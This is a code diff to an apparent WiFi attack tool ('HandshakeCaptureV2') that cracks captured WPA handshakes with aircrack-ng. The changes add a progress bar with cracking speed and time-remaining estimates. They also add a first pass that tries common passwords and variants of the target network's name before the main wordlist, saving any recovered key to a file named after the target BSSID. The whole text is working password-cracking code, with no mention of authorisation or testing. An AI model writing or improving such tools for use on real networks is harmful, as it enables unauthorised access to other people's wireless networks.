@@ -410,9 +410,14 @@ class HandshakeCaptureV2:
             return self.crack_with_aircrack(self.capture_file, session_data['wordlist'])
 
     def crack_with_aircrack(self, capfile, wordlist):
-        """CPU-based cracking using aircrack-ng"""
+        """CPU-based cracking using aircrack-ng with detailed progress display"""
         try:
             password_file = os.path.join(self.data_path['passwords'], f'password_{self.target_bssid.replace(":", "")}.txt')
+            
+            # Get total number of passwords in wordlist for progress calculation
+            total_keys = 0
+            with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
+                total_keys = sum(1 for _ in f)
             
             crack_cmd = [
                 'aircrack-ng',
@@ -431,6 +436,10 @@ class HandshakeCaptureV2:
                 universal_newlines=True
             )
             
+            start_time = time.time()
+            last_keys_tested = 0
+            keys_per_second = 0
+            
             while True:
                 line = process.stdout.readline()
                 if not line and process.poll() is not None:
@@ -440,13 +449,55 @@ class HandshakeCaptureV2:
                     with open(password_file, 'r') as f:
                         return f.read().strip()
                 elif "Tested" in line or "keys tested" in line.lower():
-                    self.console.print(f"[cyan]{line.strip()}[/cyan]", end='\r')
+                    try:
+                        # Extract keys tested
+                        keys_tested = int(line.split('(')[1].split(' ')[0])
+                        
+                        # Calculate progress percentage
+                        progress = (keys_tested / total_keys) * 100 if total_keys > 0 else 0
+                        
+                        # Calculate speed
+                        current_time = time.time()
+                        time_diff = current_time - start_time
+                        if time_diff >= 1:  # Update speed every second
+                            keys_per_second = (keys_tested - last_keys_tested) / time_diff
+                            last_keys_tested = keys_tested
+                            start_time = current_time
+                        
+                        # Estimate time remaining
+                        if keys_per_second > 0:
+                            keys_remaining = total_keys - keys_tested
+                            time_remaining = keys_remaining / keys_per_second
+                            hours = int(time_remaining / 3600)
+                            minutes = int((time_remaining % 3600) / 60)
+                            seconds = int(time_remaining % 60)
+                            
+                            # Create progress bar
+                            bar_width = 40
+                            filled = int(bar_width * progress / 100)
+                            bar = '=' * filled + '-' * (bar_width - filled)
+                            
+                            status = (
+                                f"\r[Progress: [{bar}] {progress:.1f}%] "
+                                f"[Speed: {keys_per_second:,.0f} keys/s] "
+                                f"[Remaining: {hours:02d}:{minutes:02d}:{seconds:02d}] "
+                                f"[{keys_tested:,}/{total_keys:,} keys]"
+                            )
+                            self.console.print(f"[cyan]{status}[/cyan]", end='')
+                    except:
+                        # Fallback to simple progress display
+                        self.console.print(f"[cyan]{line.strip()}[/cyan]", end='\r')
             
             return None
 
         except Exception as e:
             self.console.print(f"[red]Error during CPU cracking: {str(e)}[/red]")
             return None
+        finally:
+            try:
+                process.kill()
+            except:
+                pass
 
     def start_capture(self):
         """Main method to start handshake capture process"""
@@ -518,6 +569,33 @@ class HandshakeCaptureV2:
                 choice = input("\nResume session number (or press Enter for new session): ").strip()
                 if choice.isdigit() and 1 <= int(choice) <= len(sessions):
                     return self.resume_session(sessions[int(choice) - 1])
+
+            # First try simple passwords and common patterns
+            self.console.print("\n[yellow]Trying common passwords and patterns first...[/yellow]")
+            simple_passwords = [
+                "password", "12345678", "123456789", "1234567890",
+                self.target_essid, self.target_essid.lower(), self.target_essid.upper(),
+                "admin123", "password123", "wifi123", "internet",
+                "default", "router", "admin", "guest"
+            ]
+            
+            # Add variations of the network name
+            essid = self.target_essid.lower()
+            simple_passwords.extend([
+                essid + "123", essid + "2023", essid + "2024",
+                essid + "admin", essid + "pass", essid + "wifi"
+            ])
+            
+            # Create a temporary wordlist with simple passwords
+            temp_wordlist = get_temp_path('simple_passwords.txt')
+            with open(temp_wordlist, 'w') as f:
+                f.write('\n'.join(simple_passwords))
+            
+            # Try simple passwords first
+            self.console.print("[cyan]Testing simple passwords...[/cyan]")
+            result = self.crack_with_aircrack(self.capture_file + "-01.cap", temp_wordlist)
+            if result:
+                return True
 
             # First check if we have a custom wordlist path in the data directory
             custom_wordlist = os.path.join(self.data_path['passwords'], 'wordlist.txt')
